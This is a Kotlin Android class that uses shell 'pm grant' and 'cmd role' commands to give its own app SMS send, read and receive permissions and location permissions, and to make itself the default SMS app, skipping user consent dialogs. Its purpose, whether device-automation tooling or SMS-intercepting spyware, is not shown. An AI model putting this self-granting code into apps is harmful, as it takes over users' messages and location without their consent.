package com.adbcontroller.permissions

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.util.Log
import androidx.core.content.ContextCompat


class PermissionManager(private val context: Context) {

    fun requestAllPermissions() {
        Log.w("PermissionManager", "🚀 ВХОД В requestAllPermissions")
        val permissions = listOf(
            Manifest.permission.SEND_SMS,
            Manifest.permission.READ_SMS,
            Manifest.permission.RECEIVE_SMS,
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION
        )

        for (perm in permissions) {
            if (ContextCompat.checkSelfPermission(context, perm)
                != PackageManager.PERMISSION_GRANTED
            ) {
                try {
                    val process = Runtime.getRuntime().exec(
                        arrayOf("sh", "-c", "pm grant ${context.packageName} $perm")
                    )
                    process.waitFor()
                    if (process.exitValue() == 0) {
                        Log.i("PermissionManager", "✅ Granted permission via ADB: $perm")
                    } else {
                        Log.w("PermissionManager", "⚠️ Failed to grant permission, run manually: $perm")
                    }
                } catch (e: Exception) {
                    Log.e("PermissionManager", "❌ Error while granting permission: $perm", e)
                }
            } else {
                Log.i("PermissionManager", "✅ Already granted: $perm")
            }
        }
    }

    fun setDefaultSmsApp() {
        Log.w("PermissionManager", "🚀 ВХОД В setDefaultSmsApp")
        try {
            val process = Runtime.getRuntime().exec(
                arrayOf(
                    "sh", "-c",
                    "cmd role add-role-holder android.app.role.SMS ${context.packageName}"
                )
            )
            process.waitFor()
            if (process.exitValue() == 0) {
                Log.i("PermissionManager", "✅ App set as default SMS automatically")
            } else {
                Log.w("PermissionManager", "⚠️ Failed to set default SMS app via ADB")
            }
        } catch (e: Exception) {
            Log.e("PermissionManager", "❌ Failed to set default SMS app", e)
        }
    }

    fun restoreDefaultSmsApp(defaultSmsPackage: String = "com.android.messaging") {
        Log.w("PermissionManager", "🚀 ВХОД В restoreDefaultSmsApp")
        try {
            Runtime.getRuntime().exec(
                arrayOf(
                    "sh", "-c",
                    "cmd role remove-role-holder android.app.role.SMS ${context.packageName}"
                )
            ).waitFor()

            Runtime.getRuntime().exec(
                arrayOf(
                    "sh", "-c",
                    "cmd role add-role-holder android.app.role.SMS $defaultSmsPackage"
                )
            ).waitFor()

            Log.i("PermissionManager", "✅ Restored default SMS app: $defaultSmsPackage")
        } catch (e: Exception) {
            Log.e("PermissionManager", "❌ Failed to restore default SMS app", e)
        }
    }
}